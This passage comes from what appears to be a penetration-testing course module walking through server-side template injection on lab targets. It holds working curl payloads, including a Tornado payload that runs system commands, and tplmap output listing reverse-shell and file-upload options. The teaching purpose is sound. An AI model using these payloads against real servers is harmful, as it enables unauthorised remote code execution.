<span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Great!<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Email 49 has been subscribed. You&amp;#39;ll hear from us soon!<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
</code></pre>
<p>The application evaluated the latest expression we submitted. So, according to the diagram, we should be dealing with a Twig or Jinja2 template engine, right?</p>
<p>Unfortunately, this is not the case! If we submit any Twig or Jinja2-specific payload, the application returns <code>500: Internal Server Error</code>. Find some examples of this behavior below.</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> curl -X POST -d 'email={{_self.env.display(<span class="hljs-string">"TEST"</span>)}}' http://<span class="hljs-variable">&lt;TARGET IP&gt;</span>:<span class="hljs-variable">&lt;PORT&gt;</span>/jointheteam

<span class="hljs-variable">&lt;html&gt;</span><span class="hljs-variable">&lt;title&gt;</span>500: Internal Server Error<span class="hljs-variable">&lt;/title&gt;</span><span class="hljs-variable">&lt;body&gt;</span>500: Internal Server Error<span class="hljs-variable">&lt;/body&gt;</span><span class="hljs-variable">&lt;/html&gt;</span>
</code></pre>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ curl -X POST -d 'email={{config.items()}}' http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;:&lt;PORT&gt;/</span>jointheteam

&lt;html&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>500: Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>500: Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
</code></pre>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ curl -X POST -d 'email={{ [].class.base.subclasses() }}' http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;:&lt;PORT&gt;/</span>jointheteam

&lt;html&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>500: Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>500: Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
</code></pre>
<p>The payloads we utilized (and more) can be found on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2">PayloadsAllTheThings - Template Injection</a> and <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">HackTricks- SSTI (Server Side Template Injection)</a></p>
<p>It should be straightforward now that no methodology is bulletproof. We could compile a list of template engine-specific payloads from the abovementioned resources and fuzz the application until we conclude on the template engine being used.</p>
<p>Eventually, when submitting <a href="https://www.tornadoweb.org/en/stable/guide/templates.html">Tornado</a>-specific payloads, we will come across the below.</p>
<pre><code class="lang-shell-session"><span class="xml">root@htb[/htb]$ curl -X POST -d "email=
</span><span class="hljs-template-tag">{% <span class="hljs-name"><span class="hljs-keyword">import</span></span> os %}</span><span class="xml">
</span><span class="hljs-template-variable">{{os.system('whoami')}}</span><span class="xml">" http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/jointheteam

<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-tag">form</span> {
<span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
<span class="hljs-attribute">width</span>: <span class="hljs-number">200</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span>~ Damn Hackers ~<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span>Gentlemen, we can rebuild it <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>We have the technology <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>We have the capability to make the worlds first bionic website<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Better than it was before <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Better, Stronger, Faster.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Great!<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Email 0 has been subscribed. You&amp;#39;ll hear from us soon!<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
</code></pre>
<p>It seems we finally got it! Tornado is being utilized on the backend.</p>
<p>As already mentioned in previous sections, <code>tplmap</code> can be used to automate both the template engine identification and exploitation process.</p>
<p><strong>tplmap.py</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ./tplmap.py -u <span class="hljs-symbol">'http</span>://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam' -d email=blah

    Automatic Server-Side Template Injection Detection <span class="hljs-keyword">and</span> Exploitation Tool

[+] Testing <span class="hljs-keyword">if</span> POST parameter <span class="hljs-symbol">'email</span>' <span class="hljs-keyword">is</span> injectable
[+] Smarty plugin <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag <span class="hljs-string">'*'</span>
[+] Smarty plugin <span class="hljs-keyword">is</span> testing blind injection
[+] Mako plugin <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag '${*}'
[+] Mako plugin <span class="hljs-keyword">is</span> testing blind injection
[+] Python plugin <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag <span class="hljs-symbol">'str</span>(*)'
[+] Python plugin <span class="hljs-keyword">is</span> testing blind injection
[+] Tornado plugin <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag '{{*}}'
[+] Tornado plugin has confirmed injection <span class="hljs-keyword">with</span> tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: email
  Engine: Tornado
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind <span class="hljs-keyword">and</span> <span class="hljs-keyword">reverse</span> shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one <span class="hljs-keyword">of</span> the following options:

    <span class="hljs-comment">--os-shell                Run shell on the target</span>
    <span class="hljs-comment">--os-cmd                Execute shell commands</span>
    <span class="hljs-comment">--bind-shell PORT            Connect to a shell bind to a target port</span>
    <span class="hljs-comment">--reverse-shell HOST PORT    Send a shell back to the attacker's port</span>
    <span class="hljs-comment">--upload LOCAL REMOTE    Upload files to the server</span>
    <span class="hljs-comment">--download REMOTE LOCAL    Download remote files</span>
</code></pre>
<p>Now, proceed to this section&#39;s exercise and complete the objective either by crafting the payload yourself or through a shell obtained with the help of <code>tplmap</code>.</p>
<h2 id="ssti-exploitation-example-3">SSTI Exploitation Example 3</h2>
<hr>
<p>Let&#39;s check the last application in the SSTI series. Once again, our focus will be on identifying if the application is vulnerable to Server-Side Template Injection.</p>
<p>Navigate to the end of this section and click on <code>Click here to spawn the target system!</code>, then use the provided Pwnbox or a local VM to follow along. If you browse the target, you should come across the application below.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/jinja1.png" alt="image"></p>
<p>User input is submitted via the <code>cmd</code> parameter through a GET request. Let&#39;s submit mathematical expressions in curly brackets in the input field, such as the ones mentioned on the <code>SSTI Identification</code> section, starting with <code>{7*7}</code>.</p>
<p><strong>cURL - Interacting with the Target</strong></p>
<p>SSTI Exploitation Example 3</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -gs "http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/execute?cmd={7*7}"

<span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="css">
    <span class="hljs-selector-id">#command</span> {
        <span class="hljs-attribute">resize</span>: horizontal;
        <span class="hljs-attribute">background-color </span>: transparent;
        <span class="hljs-attribute">border-color</span>: transparent;
        <span class="hljs-attribute">font-size</span>: <span class="hljs-number">15px</span>;
        <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;

    }
    <span class="hljs-selector-id">#command</span><span class="hljs-selector-pseudo">:active</span> {
        <span class="hljs-attribute">width</span>: auto;   
    }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"x-ua-compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/static/css/jquery-ui.css"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/js/jquery-1.12.4.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/js/jquery-ui.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/js/script.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/static/css/style.css"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Windows<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"desktop"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"window"</span> <span class="hljs-attr">data-title</span>=<span class="hljs-string">"Run"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/execute"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"get"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>C:\&gt;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"cmd"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"command"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>{7*7}<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"execute"</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"window"</span> <span class="hljs-attr">data-title</span>=<span class="hljs-string">"Windows"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Windows<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Minimize the windows to the taskbar, make them full screen or close them.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Drag the title bar to move the windows or resize them from the bottom right corner.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"taskbar"</span>&gt;</span>        
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"icons"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"openWindow"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"0"</span>&gt;</span>Run<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"openWindow"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"1"</span>&gt;</span>Welcome<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"5px"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://html5-templates.com/"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"nofollow"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"templateLink"</span>&gt;</span>&amp;copy; HTML5-Templates.com<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
</code></pre>
<p>It doesn&#39;t look like the application evaluated the submitted expression. Let us continue with another expression, <code>${7*7}</code> this time.</p>
<p>SSTI Exploitation Example 3</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -gs 'http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/execute?cmd=${7*7}'

<span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="css">
    <span class="hljs-selector-id">#command</span> {
        <span class="hljs-attribute">resize</span>: horizontal;
        <span class="hljs-attribute">background-color </span>: transparent;
        <span class="hljs-attribute">border-color</span>: transparent;
        <span class="hljs-attribute">font-size</span>: <span class="hljs-number">15px</span>;
        <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;

    }
    <span class="hljs-selector-id">#command</span><span class="hljs-selector-pseudo">:active</span> {
        <span class="hljs-attribute">width</span>: auto;   
    }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"x-ua-compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/static/css/jquery-ui.css"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/js/jquery-1.12.4.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/js/jquery-ui.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/js/script.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/static/css/style.css"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Windows<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"desktop"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"window"</span> <span class="hljs-attr">data-title</span>=<span class="hljs-string">"Run"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/execute"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"get"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>C:\&gt;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"cmd"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"command"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>${7*7}<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"execute"</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"window"</span> <span class="hljs-attr">data-title</span>=<span class="hljs-string">"Windows"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Windows<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Minimize the windows to the taskbar, make them full screen or close them.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Drag the title bar to move the windows or resize them from the bottom right corner.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"taskbar"</span>&gt;</span>        
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"icons"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"openWindow"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"0"</span>&gt;</span>Run<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"openWindow"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"1"</span>&gt;</span>Welcome<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"5px"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://html5-templates.com/"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"nofollow"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"templateLink"</span>&gt;</span>&amp;copy; HTML5-Templates.com<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
</code></pre>
<p>It doesn&#39;t look like the application evaluated this expression either. What about <code>{{7*7}}</code>?</p>
<p>SSTI Exploitation Example 3</p>
<pre><code class="lang-shell-session"><span class="xml">root@htb[/htb]$ curl -gs "http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/execute?cmd=</span><span class="hljs-template-variable">{{7*7}}</span><span class="xml">"

<span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="css">
    <span class="hljs-selector-id">#command</span> {
        <span class="hljs-attribute">resize</span>: horizontal;
        <span class="hljs-attribute">background-color </span>: transparent;
        <span class="hljs-attribute">border-color</span>: transparent;
        <span class="hljs-attribute">font-size</span>: <span class="hljs-number">15px</span>;
        <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;

    }
    <span class="hljs-selector-id">#command</span><span class="hljs-selector-pseudo">:active</span> {
        <span class="hljs-attribute">width</span>: auto;   
    }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"x-ua-compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/static/css/jquery-ui.css"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/js/jquery-1.12.4.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/js/jquery-ui.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/js/script.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/static/css/style.css"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Windows<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"desktop"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"window"</span> <span class="hljs-attr">data-title</span>=<span class="hljs-string">"Run"</span>&gt;</span>
